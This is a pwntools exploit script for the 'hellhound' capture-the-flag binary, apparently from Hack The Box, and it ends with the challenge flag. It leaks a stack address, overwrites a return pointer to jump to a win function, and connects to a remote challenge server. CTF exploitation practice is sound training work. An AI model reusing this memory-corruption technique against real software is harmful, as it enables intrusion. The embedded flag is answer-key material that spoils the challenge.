#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template hellhound
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('hellhound')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *main+45
#b *main+184
b *main+239
b *main+326
b *0x00400d91
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./.glibc/'

#io = start(env={'LD_PRELOAD':'./glibc/libc.so.6'})
io = remote('178.62.76.45', 30440)

def stack_leak():
    io.sendline(b'1')
    io.recvuntil(b'[+] In the back of its head you see this serial number: [')
    leak = int(io.recvline().rstrip()[:-1])
    return leak

def write(data):
    io.sendline(b'2')
    #io.recvuntil(b'code: ')
    io.send(data)

def free():
    io.sendlineafter(b'>> ', b'69')

leak = stack_leak()
print(f'[+] Stack leak: {hex(leak)}')

pc_offset = leak + 0x50
print(f'[+] PC offset: {hex(pc_offset)}')

win = p64(0x400977)

io.sendafter(b'>> ', b'2')
io.sendafter(b'code: ', p64(0xdeadbeef) + p64(pc_offset))
io.sendafter(b'>> ', b'3')
io.sendafter(b'>> ', b'2')
io.sendafter(b'code: ', win + p64(0x0))
io.sendafter(b'>> ', b'3')

# HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}
io.interactive()

